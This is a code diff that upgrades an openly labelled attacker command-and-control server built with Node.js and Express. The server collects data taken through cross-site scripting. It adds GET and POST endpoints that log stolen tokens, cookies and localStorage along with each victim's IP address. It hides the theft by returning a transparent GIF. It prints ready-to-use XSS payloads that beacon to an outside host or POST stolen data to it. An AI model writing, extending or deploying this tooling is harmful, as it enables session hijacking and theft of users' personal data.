@@ -2,35 +2,39 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
+const bodyParser = require('body-parser'); // Needed for POST bodies
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Enable CORS so the victim's browser allows the request
+// Enable CORS for all domains so victims can send data
 app.use(cors());
 
-// The "Steal" Endpoint
-// Matches the payload: http://attacker.com/steal.php?token=...
-app.get('/steal.php', (req, res) => {
+// Parse JSON and URL-encoded bodies
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// === 1. The "Steal" Endpoint (GET) ===
+// Good for simple token stealing via <img src="...">
+// Payload: <img src=x onerror="new Image().src='https://.../steal?token='+myid">
+app.get('/steal', (req, res) => {
     const token = req.query.token;
+    const data = req.query.data; // Capture generic data
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
     const timestamp = new Date().toISOString();
 
-    if (token) {
-        const logEntry = `[${timestamp}] IP: ${ip} | Token: ${token} | UA: ${userAgent}\n`;
-        
-        // 1. Log to Console (Instant Feedback)
-        console.log(`\n[+] 💰 JACKPOT! STOLEN TOKEN: ${token}`);
-        console.log(`    From IP: ${ip}`);
+    const logEntry = `[${timestamp}] [GET] IP: ${ip} | Token: ${token} | Data: ${data} | UA: ${userAgent}\n`;
 
-        // 2. Save to File (Persistence)
-        fs.appendFile(path.join(__dirname, 'stolen_tokens.txt'), logEntry, (err) => {
-            if (err) console.error('Error saving to file:', err);
-        });
-    }
+    console.log(`\n[+] 🎣 GET Catch!`);
+    if (token) console.log(`    Token: ${token}`);
+    if (data) console.log(`    Data: ${data}`);
+    console.log(`    IP: ${ip}`);
 
-    // 3. Stealth Mode: Return a 1x1 transparent GIF so the user sees nothing broken
-    // This prevents a "broken image" icon from showing up in the chat
+    fs.appendFile(path.join(__dirname, 'stolen_data.txt'), logEntry, (err) => {
+        if (err) console.error('Error saving to file:', err);
+    });
+
+    // Return transparent 1x1 GIF
     const img = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
     res.writeHead(200, {
         'Content-Type': 'image/gif',
@@ -39,12 +43,33 @@ app.get('/steal.php', (req, res) => {
     res.end(img);
 });
 
-// Default route to verify it's running
+// === 2. The "Harvest" Endpoint (POST) ===
+// Better for large data (cookies, localStorage, user lists)
+// Requires fetch() or XHR in the payload
+app.post('/harvest', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const timestamp = new Date().toISOString();
+    const body = req.body;
+
+    console.log(`\n[+] 💰 POST JACKPOT! Massive Data Haul from ${ip}`);
+    console.log(JSON.stringify(body, null, 2));
+
+    const logEntry = `[${timestamp}] [POST] IP: ${ip}\n${JSON.stringify(body, null, 2)}\n----------------\n`;
+
+    fs.appendFile(path.join(__dirname, 'harvested_data.txt'), logEntry, (err) => {
+        if (err) console.error('Error saving to file:', err);
+    });
+
+    res.json({ status: 'success' });
+});
+
+// Default route
 app.get('/', (req, res) => {
-    res.send('<h1>👾 Attacker Server is Online 👾</h1><p>Ready to listen for incoming tokens...</p>');
+    res.send('<h1>👾 Advanced Attacker C2 Server Online 👾</h1><p>Listening for GET /steal and POST /harvest</p>');
 });
 
 app.listen(PORT, () => {
-    console.log(`\n[!] Attacker Server Running on port ${PORT}`);
-    console.log(`[!] Test Payload: <img src=x onerror="new Image().src='http://localhost:${PORT}/steal.php?token='+utk">`);
+    console.log(`\n[!] Server Running on port ${PORT}`);
+    console.log(`[!] GET Payload (Simple): <img src=x onerror="new Image().src='https://your-url.com/steal?token='+myid">`);
+    console.log(`[!] POST Payload (Advanced): fetch('https://your-url.com/harvest', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(stolenData)})`);
 });
